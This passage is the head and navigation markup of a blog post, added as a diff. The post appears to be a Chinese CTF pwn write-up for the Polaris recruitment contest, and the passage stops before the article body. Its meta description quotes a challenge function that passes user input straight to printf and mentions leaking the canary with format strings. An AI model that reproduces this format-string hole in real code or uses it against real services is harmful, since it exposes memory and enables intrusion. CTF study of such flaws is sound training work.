@@ -1,0 +1,1614 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwnez-nc  nc连一下？？？     这是干什么   难道限制7byte，还会ban字符   出题人怎么这么坏啊 这到底在考什么 格式化字符串？？？   wc,我是天才 可以还原一下函数 char buf[8];  scanf(“%7s”, buf);  printf(buf);     出canary了     %i$s 这内存里也没flag啊      字节序列 含义 解释    **">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Polarisctf招新赛">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/04/23/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="pwnez-nc  nc连一下？？？     这是干什么   难道限制7byte，还会ban字符   出题人怎么这么坏啊 这到底在考什么 格式化字符串？？？   wc,我是天才 可以还原一下函数 char buf[8];  scanf(“%7s”, buf);  printf(buf);     出canary了     %i$s 这内存里也没flag啊      字节序列 含义 解释    **">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660348085-9bdacd69-f7dc-438c-87f1-46fe9ad8f8e7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660403396-3bd348ee-9ec7-41ce-b41a-e6aaab8910f8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660528453-11721a87-af03-4499-b691-0075488b7a74.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660549339-e4409bbb-db04-4453-b797-c9173cb82255.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774661520421-bacedaab-e783-4b0f-bf53-debe8501dbce.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774661860800-b0268f9c-3a1a-42a8-98cd-1d17b44e956d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662131949-a86ab225-ca64-43da-926c-5d7fba833a17.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662681196-558df258-4392-491b-9d0f-6abd0c20a97d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774662709611-16c54691-c0c5-4edf-87fa-f0a49b27d62f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774669900975-8b894788-7b13-4b44-ad6b-d6f5a7ad13ba.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670081760-5fecf51c-2fe0-421c-8364-bfe99a03ab23.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774669741522-8b281994-fb48-4afa-8833-aa3f16e415b4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670545491-e1d19886-5c83-4278-bae6-641fd990a4ba.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670566551-a0f1a831-db86-45de-ab8a-72fcc22e873c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670644740-ab93c594-b2fd-49fb-b7c8-ae8c5e0dcdf8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774675249077-28076ab7-caf5-46b2-815a-8c060fd12f13.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670730831-706e6f31-fcc3-4841-bb19-12eefb2bbcf9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774670782283-8e13ab7a-2598-4976-b8c9-0f9ee7db6b4a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774673661438-08393e53-d129-4a81-84ab-a827a4c8a428.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774673687799-40889045-8349-4824-98ad-75fb81a1e2d1.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774682062772-c862bccc-f96e-4eaa-9c91-766019d6bbe5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774685233030-088fd31c-4b9e-4798-9cd3-853a70258036.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774696897127-0d41be2a-50ee-4553-875f-177b781804d8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774697365603-5116cd8e-268b-47b3-a5fb-8b9517838961.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774750577606-8624cf13-f570-4508-91c7-0393056010e5.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774750675570-1d5149d4-f3ca-4810-93e3-3a036f214782.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774751523514-8d51dcf9-3456-414a-b325-f079901f77f9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774751858769-ba97400b-74c7-42d3-834b-68e7ddfbd626.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752105599-bdd0f60e-0f2f-4d8e-b094-3246a2173ddc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752220570-bba01268-4b3b-497a-addd-556ad38e0bb2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774752378273-755191d3-0f7e-46b7-abfc-518f9e633cee.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754289045-ee6970d0-d776-4e5d-bb4e-f54407855752.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754354684-9f3ebdb6-59bb-4662-88c4-58a9bd0bd70f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774754913994-de313bc0-6a32-4e6d-887f-c23ff92daced.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774756590998-4d1cd9fb-87cf-4100-b03f-8377f70e98ee.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774757522456-f4c0202b-b96d-4c22-b8e8-9117f86d47fd.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774761522017-56d07ec9-6fb4-4572-9054-c090eb5ab21f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132009577-782ba51a-a226-4606-b8aa-05b90c2068fa.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765018869-d9312826-f34c-4622-828a-e0e6e5f71747.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765502719-e183e343-5d52-4c25-913a-b85b0efa3dd2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774765906170-9c8a2d0a-61f3-4a2c-a0f8-b6aafcf16179.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774766839823-a2bea1fa-f6cd-41e2-9d94-ca744826b0cf.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774767426444-99a10528-19b2-487c-aec6-af06ebabff39.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775131569426-4e7e366d-1706-4e73-bc32-8f477dd8dc97.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132678545-46a7f1b0-e85c-4ccc-83ad-73ce2b9dd6c6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775133126809-6676d8e6-0e0f-4c75-9a48-2c384ce205c0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769557716-81bf2c59-10d1-4296-a835-2a100ae0c7c6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769573424-e83a97d6-990b-4be9-aecc-48492920410c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774769585626-6f15df6d-67b2-4605-b76a-253351c2fa49.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770387924-da6db9b0-0ecd-48ee-b3ec-ba097a283c33.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770552848-4aeb1a7c-da54-44d3-b85b-8d04354741a8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770562924-8d03007f-9714-418c-9d4f-b37db94ec9a7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770639450-0c8ef403-2994-4a3c-a617-89b4f8107d0d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774770666326-1cc70204-1b68-4491-a18f-810141649756.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774771561042-00a2107c-a949-4928-8824-dabb0b08a6d5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774772461712-6d742006-83fc-4999-9107-d7848dcea9de.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774773850707-657b42a8-a20f-448f-85ef-833163b51d7c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774773916491-055d8352-662e-416f-88a1-a1dd2b063600.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774022980-9a287ad4-4a1f-432b-9205-46dca8fd41dc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774056784-cb159475-3a7a-4b0f-81cb-c9002f175580.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774226837-94fc652b-fb5c-441a-ba2a-9ac8f715e59b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775039041676-1daceb17-d955-4fd6-bf0c-2e3932933921.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774774278009-05674c76-1269-40b5-8797-9976b7b5e29d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775133282111-6daa11e0-404e-4821-8dff-310f569df26a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774788539777-b40a0a98-63c7-49e3-a011-93d53490fc18.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774788695400-6f6aaf5d-ceed-48fd-9195-43779d0cb6f8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775004998968-a441c5c5-09f4-4a19-befa-7dfab582fa64.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005065394-da659373-3108-4ff6-bf37-3c834db64c30.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775006041012-817a30f7-2c27-4581-84bf-1f6beda24ad4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005404430-5793235a-492b-4b8e-9c95-0c1a3e828602.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005566612-ed787f89-d6fe-4108-8866-8f661c437754.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005648968-8ab0d834-97aa-498b-8edd-9a197f8af60e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005707164-63b42924-d45e-4857-9b11-809de2242dee.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005774332-d453bf76-b6dc-47a4-afd8-5378423478a5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775005944541-d19fd859-fbec-489a-9099-3dd7c4ec8770.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775007246157-e6eccc95-a779-4b3d-8ed0-d5de9beca695.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775030653292-3d1f3ab3-ccb9-4dbc-9567-db59907bd389.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775032909653-0ef45a32-9039-4cb0-967f-ec3d9352dfe0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042784953-a43ae1a3-a98f-45cd-8bdb-f5e2219567c9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042795166-0f736766-64fd-43d8-b074-f529ef37d362.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042940703-2a58e121-2a00-4c22-b5d6-71040cdf69d4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775042985240-ee4056ef-6669-4908-ba29-de21cdf0953b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043024676-1d176863-0377-41d4-ae84-defef038029f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043521893-ca225047-b64d-4f94-8294-5e4f93d9ff3c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775043857268-45603227-449e-4299-938a-f91070fcfc22.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044061984-e2678b91-2cbc-4362-8a06-3b780975772e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044338911-c1843632-6770-43f2-b735-35c815d249bd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775044527401-289d0e7c-e08e-45b1-b228-bd626d14ee20.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047788823-a00fd4bf-e208-42f2-b3f0-398f73a54763.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047760044-16842b1d-0264-48fc-91a9-450b3acf1b90.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775047842080-e1d23bb8-e409-46a0-898c-fa174887ac22.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775048500072-50dcee28-3da3-4a55-bf6d-4c61390a9135.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049030976-2209ea70-e484-4d03-ac02-6c27081a0117.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049569086-c4d65de1-3cdd-43b2-a990-e3e22829c5f0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050164588-14bd2b2d-fa92-4e9f-8cbc-7126e99b5e77.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775049964267-5a4a6b83-65f2-4698-896a-bb0fae839430.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050423864-57420bde-322e-4e1b-9747-a0eebf0ad99d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050438063-77c6a44f-fa64-48e3-8195-3e15a9c6b718.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050608403-b9bff0d8-9aa3-4184-8a8f-6a14f6e7906f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050623417-e3c46aa2-c61f-4aa1-8e74-9f8666e1a1a1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050796165-c31dfc41-00fd-4517-945c-bc9286a46b09.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050843778-b67cff1b-2407-4398-90c1-b47a28fedc16.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050862599-aa246268-0d82-4e70-95f9-0abf61f2e71f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775050887979-9199d370-26c2-4132-a434-160fc34af100.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051018662-dcf01b50-65eb-498a-a478-ce8c165a171a.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051311568-a5bf36bb-c9a6-4bcf-8aed-093a5e1524ea.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775051371636-7b2d058b-6a90-4718-bc1f-3ca411e1da69.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132603352-df1c1fdb-355d-48e0-81a0-c46f1533d7bf.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1775132965462-972d67ad-4ba9-4494-8c86-da699d943566.png">
+<meta property="article:published_time" content="2026-04-23T12:53:46.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:25:16.904Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/Polarisctf%E6%8B%9B%E6%96%B0%E8%B5%9B/1774660348085-9bdacd69-f7dc-438c-87f1-46fe9ad8f8e7.png">
+  
+  
+  
+  <title>Polarisctf招新赛 - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
